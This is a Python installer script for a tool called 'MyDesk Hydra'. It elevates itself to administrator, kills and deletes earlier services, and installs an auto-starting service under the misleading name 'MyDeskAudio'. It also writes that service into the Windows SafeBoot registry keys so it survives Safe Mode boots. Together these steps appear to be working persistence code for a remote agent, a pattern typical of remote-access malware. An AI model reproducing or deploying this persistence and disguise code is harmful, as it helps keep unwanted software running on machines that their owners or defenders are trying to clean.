import sys
import os
import shutil
import subprocess
import ctypes
import winreg


# Check for Admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False


if not is_admin():
    # Re-run the program with admin rights
    try:
        params = subprocess.list2cmdline(sys.argv)
        ret = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable, params, None, 1
        )
        if ret > 32:
            sys.exit(0)  # Elevation successful, this process can exit
        else:
            print(
                f"Failed to elevate permissions (Error code: {ret}). Please run as administrator."
            )
    except Exception as e:
        print(f"Failed to elevate: {e}")
    sys.exit(1)

# Paths
INSTALL_DIR = r"C:\ProgramData\MyDesk"
SERVICE_SRC = "MyDeskAudio.exe"  # This is the consolidated "Shield"
AGENT_SRC = "MyDeskAgent.exe"


def install_services():
    print("Installing MyDesk Hydra...")

    # 1. Create Directory
    if not os.path.exists(INSTALL_DIR):
        os.makedirs(INSTALL_DIR)

    # 2. Kill and REMOVE old services if running
    subprocess.run(["sc", "stop", "MyDeskAudio"], shell=True, capture_output=True)
    subprocess.run(["sc", "stop", "MyDeskUpdate"], shell=True, capture_output=True)
    subprocess.run(
        ["sc", "delete", "MyDeskAudio"], shell=True, capture_output=True
    )  # Cleanup before re-registration
    subprocess.run(
        ["sc", "delete", "MyDeskUpdate"], shell=True, capture_output=True
    )  # Goodbye Hydra Dual

    subprocess.run(
        ["taskkill", "/F", "/IM", "MyDeskAudio.exe"], shell=True, check=False
    )
    subprocess.run(
        ["taskkill", "/F", "/IM", "MyDeskAgent.exe"], shell=True, check=False
    )

    # 3. Copy/Extract Files
    # If running from PyInstaller bundle, look in sys._MEIPASS
    base_path = getattr(sys, "_MEIPASS", os.path.dirname(os.path.abspath(__file__)))

    try:
        print(f"Copying {SERVICE_SRC} to {INSTALL_DIR}...")
        shutil.copy(
            os.path.join(base_path, SERVICE_SRC), os.path.join(INSTALL_DIR, SERVICE_SRC)
        )
    except Exception as e:
        print(f"FATAL: Failed to copy required service file: {e}")
        sys.exit(1)

    # Agent might be downloaded later, so its copy is optional
    try:
        agent_path = os.path.join(base_path, AGENT_SRC)
        if os.path.exists(agent_path):
            print(f"Copying optional {AGENT_SRC} to {INSTALL_DIR}...")
            shutil.copy(agent_path, os.path.join(INSTALL_DIR, AGENT_SRC))
    except Exception as e:
        print(f"Warning: Could not copy {AGENT_SRC}: {e}")

    # 4. Register Single Service
    try:
        service_path = os.path.join(INSTALL_DIR, SERVICE_SRC)
        print(f"Registering service: {service_path}")
        result = subprocess.run(
            [service_path, "--startup", "auto", "install"],
            check=True,
            capture_output=True,
            text=True,
        )
        print(result.stdout)
    except (subprocess.CalledProcessError, FileNotFoundError) as e:
        print(f"FATAL: Failed to register service: {e}")
        if hasattr(e, "stderr"):
            print(e.stderr)
        sys.exit(1)

    # 5. Safe Mode Whitelist (Registry)
    try:
        key_str = r"SYSTEM\CurrentControlSet\Control\SafeBoot\Minimal"
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, key_str, 0, winreg.KEY_ALL_ACCESS
        ) as key:
            winreg.CreateKey(key, "MyDeskAudio")

        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, key_str + r"\MyDeskAudio", 0, winreg.KEY_WRITE
        ) as sk:
            winreg.SetValueEx(sk, "", 0, winreg.REG_SZ, "Service")

        # Network as well
        key_net_str = r"SYSTEM\CurrentControlSet\Control\SafeBoot\Network"
        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE, key_net_str, 0, winreg.KEY_ALL_ACCESS
        ) as key:
            winreg.CreateKey(key, "MyDeskAudio")

        with winreg.OpenKey(
            winreg.HKEY_LOCAL_MACHINE,
            key_net_str + r"\MyDeskAudio",
            0,
            winreg.KEY_WRITE,
        ) as sk:
            winreg.SetValueEx(sk, "", 0, winreg.REG_SZ, "Service")

        print("Safe Mode Persistence: ENABLED")
    except Exception as e:
        print(f"Registry Error: {e}")

    # 6. Start Service
    print("Starting Main Service Shield...")
    result_a = subprocess.run(
        ["sc", "start", "MyDeskAudio"], capture_output=True, text=True
    )
    if result_a.returncode != 0:
        print(
            "Warning: Failed to start MyDeskAudio service. It may already be running or disabled."
        )
        print(result_a.stderr.strip())

    print("Installation Complete.")


if __name__ == "__main__":
    try:
        install_services()
    except Exception as e:
        print(f"Fatal Error: {e}")
        input("Press Enter to exit...")
